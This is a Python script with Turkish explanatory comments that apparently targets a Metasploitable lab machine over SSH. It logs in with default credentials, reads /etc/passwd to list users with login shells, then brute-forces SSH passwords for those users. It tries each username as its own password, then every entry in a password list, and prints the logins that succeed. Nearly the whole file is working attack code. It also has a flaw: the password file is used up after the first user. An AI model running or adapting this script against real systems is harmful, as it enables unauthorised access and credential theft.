import paramiko  # paramiko modülünü import ediyoruz, bu modül SSH üzerinden bağlantı kurmamızı sağlar.

# SSHClient sınıfından bir nesne oluşturuyoruz, bu nesne ile SSH bağlantısı kuracağız.
ssh = paramiko.SSHClient()

# SSHClient nesnesinin host anahtarlarını nasıl ele alacağını belirliyoruz. 
# AutoAddPolicy, bilinmeyen bir host ile karşılaşıldığında bu host'u otomatik olarak kabul eder.
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# Bağlantı kurmak istediğimiz makinenin IP adresini, port numarasını ve kullanıcı bilgilerini tanımlıyoruz.
ip = '10.0.2.5'  # Metasploit makinemizin IP adresi.
port = 22  # SSH için standart port numarası.
username = 'msfadmin'  # SSH için kullanıcı adı.
password = 'msfadmin'  # SSH için kullanıcı şifresi.

# ssh.connect yöntemi ile belirlediğimiz IP adresine, port numarasına ve kullanıcı bilgilerine göre SSH bağlantısı kuruyoruz.
ssh.connect(ip, port=port, username=username, password=password)

# Bağlandıktan sonra, uzaktaki makinede çalıştırmak istediğimiz komutu tanımlıyoruz.
command = 'cat /etc/passwd'

# exec_command yöntemi ile tanımladığımız komutu uzaktaki makinede çalıştırıyoruz.
# stdin, stdout ve stderr nesnelerini döndürüyor, bu nesneler üzerinden komutun giriş, çıkış ve hata bilgilerine ulaşabiliriz.
stdin, stdout, stderr = ssh.exec_command(command)

# Komutun çıkışını stdout nesnesi üzerinden okuyoruz.
cmd_output = stdout.read()

# SSH bağlantısını kapatıyoruz.
ssh.close()

# Komutun çıkışını okuduktan sonra, byte türündeki veriyi decode ederek stringe çeviriyoruz ve satırlara bölüyoruz.
etcpasswd = cmd_output.decode().split("\n")

user_list = []  # kullanıcı isimlerini tutması için boş bir kullanıcı listesi oluşturuyoruz
# /etc/passwd dosyasındaki her bir satırı tek tek inceleyerek, 
# shell olarak /bin/bash veya /bin/sh kullanan kullanıcıları buluyoruz ve bu satırları yazdırıyoruz.
for ep in etcpasswd:
    if "/bin/bash" in ep or "/bin/sh" in ep:  # Eğer satırda /bin/bash veya /bin/sh varsa.
        # Bu satırı ekrana yazdırıyoruz.
        user = ep.split(":")[0]  # burada ep değerlerimin 0. indeksini alıyorum o da kullanıcı isimlerine denk geliyor 
        user_list.append(user)  # kullanıcı isimlerini listemize ekliyoruz
print(user_list)

# passwords.txt dosyasını açıp r yani read ile okuyoruz 
f = open("passwords.txt", "r")

# SSH bağlantısını deneyecek bir fonksiyon tanımlıyoruz.
def trySsh(user, password):
    ssh = paramiko.SSHClient()  # Yeni bir SSHClient nesnesi oluşturuyoruz.
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Host anahtarlarını otomatik olarak ekliyoruz.
    success = False  # Başarı durumunu başlangıçta False olarak ayarlıyoruz.
    try:
        # Belirtilen kullanıcı adı ve şifre ile SSH bağlantısı kurmaya çalışıyoruz.
        ssh.connect(ip, username=user, password=password.strip(), timeout=0.1, banner_timeout=0.1)
        success = True  # Bağlantı başarılı olursa success değişkenini True yapıyoruz.
    except Exception as e:
        pass  # Hata durumunda hiçbir şey yapmıyoruz, sadece geçiyoruz.
    finally:
        ssh.close()  # Bağlantıyı kapatıyoruz.
        return success  # Bağlantı başarılı olup olmadığını döndürüyoruz.

# Kullanıcı listesi içindeki her kullanıcı için SSH bağlantısı deniyoruz.
for user in user_list:
    if (trySsh(user, user)):  # Kullanıcı adı ve şifre aynı ise bağlantı kurmayı deniyoruz.
        print("bağlantı kuruldu. kullanıcı adı:", user, "şifre", user)
    else:
        # Kullanıcı adı ve şifre aynı değilse, passwords.txt dosyasındaki her şifreyi deneyerek bağlantı kurmayı deniyoruz.
        for password in f:
            if (trySsh(user, password)):
                print("bağlantı kuruldu. kullanıcı adı:", user, "şifre", password.strip())
